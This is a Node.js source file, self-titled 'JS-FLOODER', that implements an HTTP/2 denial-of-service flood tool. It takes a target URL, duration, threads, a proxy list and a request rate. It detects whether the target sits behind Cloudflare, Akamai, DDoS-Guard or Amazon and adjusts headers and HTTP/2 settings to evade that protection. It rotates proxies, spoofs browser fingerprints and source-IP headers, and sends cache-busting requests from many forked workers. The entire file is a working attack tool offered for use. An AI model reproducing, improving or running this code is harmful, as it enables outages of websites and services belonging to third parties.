const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, cluster = require('cluster')
//random ua by string
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log('ISP ', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
		 pro =[ 
			{'Methods' : ''},
		    {'Quic-Version' : '0x00000001'},
			
		]
		  val = { 'NEl': Math.random() < 0.5 ? JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}) : JSON.stringify({
	  "success_fraction":0,
      "report_to":Math.random() < 0.5 ? "cf-nel" : 'default',
      "max_age":604800}),
		  }
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
           
	  }
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_128_GCM_SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-CHACHA20-POLY1305'
		, ]
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
let query = process.argv[8];
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('JS-FLOODER'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
 console.log('default : query : true'.red);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
	console.clear()
	console.log(`success attack`.bgRed)
		, console.log(`flood`.yellow)
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}

async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	

	const rateHeaders = [
{ "dnt": "1"  },
{ "te" : "trailers"},
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + '/' },
{ "source-ip": randIp  },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
];
const rateHeaders2 = [
{ "dnt": "1"  },
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + "/" },
{ "cookie": generateRandomString(1,5) + "=" + generateRandomString(120,150)},
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
];


var hd1 = [ 
{ 'x-aspnet-version': randstrsValue},
//{undefined}
]
var hd2 = [ 
{'accept-charset' : randstrsValue},
{'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
//{undefined}
]
const rhd = [
{ "worker": Math.random() < 0.5 ? 'true' : 'null'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
{"expect-ct": "enforce"},
//{undefined}
]
var hdd = [
	{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
	undefined
]
     
var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11","Windows NT 11.0"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Windows NT 11.0": Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}.0; rv:10${randstra(1)}.0` : `Win64; x64`,
  "Macintosh": Math.random() < 0.5 ? `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}` : `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}; rv:10${randstra(1)}.0  ` ,
  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:10${randstra(1)}.0` : `Linux x86_64`
};
var browserss = [
	`Firefox/118.0`,
	`Firefox/117.0`,
	`Firefox/116.0`,
	`Firefox/115.0`,
	`Firefox/114.0`,
	`Firefox/113.0`,
	`Firefox/112.0`,
	`Firefox/111.0`,
	`Firefox/110.0`,
	`Firefox/109.0`,
]
var browsers = [
	"Chrome/118.0.0.0 Safari/537.36",
   "Chrome/117.0.0.0 Safari/537.36",
   "Chrome/116.0.0.0 Safari/537.36",
   "Chrome/115.0.0.0 Safari/537.36",
   "Chrome/114.0.0.0 Safari/537.36",
   "Chrome/113.0.0.0 Safari/537.36",
   "Chrome/112.0.0.0 Safari/537.36",
   "Chrome/111.0.0.0 Safari/537.36",
   "Chrome/110.0.0.0 Safari/537.36",
   "Chrome/109.0.0.0 Safari/537.36",
   "Chrome/108.0.0.0 Safari/537.36",
  "Version/16.5 Safari/605.1.15",
  "Chrome/118.0.0.0 Safari/537.36 Edg/118", 
  "Chrome/117.0.0.0 Safari/537.36 Edg/117", 
  "Chrome/116.0.0.0 Safari/537.36 Edg/116", 
 "Chrome/115.0.0.0 Safari/537.36 Edg/115",
 "Chrome/114.0.0.0 Safari/537.36 Edg/114",
 "Chrome/113.0.0.0 Safari/537.36 Edg/113",
 "Chrome/112.0.0.0 Safari/537.36 Edg/112",
 "Chrome/111.0.0.0 Safari/537.36 Edg/111",
 "Chrome/110.0.0.0 Safari/537.36 Edg/110",
 "Chrome/109.0.0.0 Safari/537.36 Edg/109",
 "Chrome/108.0.0.0 Safari/537.36 Edg/108",
 "Chrome/118.0.0.0 Safari/537.36 Vivaldi/118",
 "Chrome/117.0.0.0 Safari/537.36 Vivaldi/117",
 "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
 "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
 "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
 "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
 "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
 "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
 "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
 "Chrome/109.0.0.0 Safari/537.36 Vivaldi/109",
 "Chrome/118.0.0.0 Safari/537.36 OPR/118",
 "Chrome/117.0.0.0 Safari/537.36 OPR/117",
 "Chrome/116.0.0.0 Safari/537.36 OPR/116",
 "Chrome/115.0.0.0 Safari/537.36 OPR/115",
 "Chrome/114.0.0.0 Safari/537.36 OPR/114",
 "Chrome/113.0.0.0 Safari/537.36 OPR/113",
 "Chrome/112.0.0.0 Safari/537.36 OPR/112",
 "Chrome/111.0.0.0 Safari/537.36 OPR/111",
 "Chrome/110.0.0.0 Safari/537.36 OPR/110",
 "Chrome/109.0.0.0 Safari/537.36 OPR/109",
 "Chrome/108.0.0.0 Safari/537.36 OPR/108",			 
];
function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 
const randomBrowser = getRandomValue(browsers);
const randomsBrowser = getRandomValue(browserss);
var uas = await Math.random() < 0.5 ? `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`: `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:109.0) Gecko/20100101 ${randomsBrowser}`


//console.log(uas)
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
   hd = {}
     header = {
    ':method': 'HEAD'
		, ':authority': parsed.host
		, 'x-forwarded-proto':'https'
  };
  if (query === 'true'){
	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
  }else if (query === 'false'){
	header[':path']=parsed.path;
  }else{
	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
  }
  

header[':scheme']= 'https';
header['cache-control']= Math.random() < 0.5 ? 'no-cache, no-store' : `max-age=${randstra(4)}`;
//header['vary'] = 'Accept-Encoding';
header["upgrade-insecure-requests"]= "1";
const brw = ['chrome','firefox','edge','macos','linux','yandex']
let dynHeaders
let ci
let bruh 
async function rand() {
	var browser = brw[Math.floor(Math.random() * brw.length)]
	if (browser === 'chrome') {
    
	 dynHeaders = {
		...hd[Math.floor(Math.random() * hd.length)], 
		...header,
		...val,
		'User-Agent':  uas,
        ...pro,
		...hdd[Math.floor(Math.random() * hdd.length)],
		...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
		...hd2[Math.floor(Math.random() * hd2.length)],
		...rhd[Math.floor(Math.random() * rhd.length)],
		...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
		...hd1[Math.floor(Math.random() * hd1.length)],
		...(Math.random() < 0.5 ? {"RTT": Math.floor(Math.random() * 500) + 100} : {}),
		
					  };
					}else if (browser === 'firefox'){
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...val,
                            ...pro,
							...header,
							'User-Agent':  uas,
							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd2[Math.floor(Math.random() * hd2.length)],
							...hdd[Math.floor(Math.random() * hdd.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
										  };
					} else if (browser === 'yandex') {
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...val,
							...hd2[Math.floor(Math.random() * hd2.length)],
                            ...pro,
							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  uas,
							...hdd[Math.floor(Math.random() * hdd.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
										  };
					} else if (browser === 'linux') {
						dynHeaders = {
							
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...val,
							...hd2[Math.floor(Math.random() * hd2.length)],
                            ...pro,
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...hdd[Math.floor(Math.random() * hdd.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
										  };
					} else if (browser === 'macos') {
						dynHeaders = {
							...header,
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							...val,
							...hd2[Math.floor(Math.random() * hd2.length)],
                            ...pro,
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...hdd[Math.floor(Math.random() * hdd.length)],
							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
							...rhd[Math.floor(Math.random() * rhd.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
										  };
					} else {
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							'User-Agent':  uas,
							...val,
                            ...pro,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd2[Math.floor(Math.random() * hd2.length)],
							...hdd[Math.floor(Math.random() * hdd.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
							...(Math.random() < 0.5 ? {"RTT": Math.floor(Math.random() * 500) + 100} : {}),
										  };
					}
					return dynHeaders
	
}
rand()
	const agent = await new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
			, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
		, }
	, };
	connection = await http.request(Optionsreq, (res) => {});
 connection.on('error', (err) => {
 
 if (err) return
});
 connection.on('timeout', async () => {
		return
		});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol:['TLSv1_3_method'] 
		, echdCurve: Math.random() < 0.5 ? "X25519" : 'auto'
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	async function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = await tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', async function(res, socket) {

		const tlsSocket = await createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        hd['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
	const client = await http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {  
       enablePush: false,      
			},
       rejectUnauthorized: false,
			 enableConnectProtocol: false,
			 allowHTTP1: true
		});
   const streams = []
		client.on('stream', (stream, headers) => {
		if (isp === 'Akamai Technologies, Inc.' ) {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 4096;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] =16384;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 32768;
			
		} else if (isp === 'Cloudflare, Inc.') {
			stream.priority = Math.random() < 0.5 ? 0 : 1;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x04)] = Math.random() < 0.5 ? 16777215 : 16384;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x05)] = Math.random() < 0.5 ? 65536 :65535;
			
			
		} else if (isp === 'Ddos-guard LTD') {
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 8;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
			
			
		} else if (isp === 'Amazon.com, Inc.') {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		} else {
		    stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
		    stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		}
    streams.push(stream);
	})

		client.on("connect", async () => {
			setInterval(async () => {
		  	for (let i = 0; i < rps; i++) {
  const request = await client.request(dynHeaders);
  const request1 = await client.request(dynHeaders);
  const request2 = await client.request(dynHeaders);
  	request.end()
	request1.end()
	request2.end()
  
  				}
			}, interval);
		});
		if (streams.length > 0) {
  const streamToReset = streams[0];

  client.rstStream(streamToReset.id, 8);
  return flood()
}
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return flood()
		});

		client.on('timeout', async () => {
		await client.destroy();
		await tlsSocket.destroy();
		await socket.destroy();
		return flood()
		});



client.on("error", async (error) => {
	        if (error){
				await client.destroy();
				await tlsSocket.destroy();
				await socket.destroy();
				 return flood()
			}
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
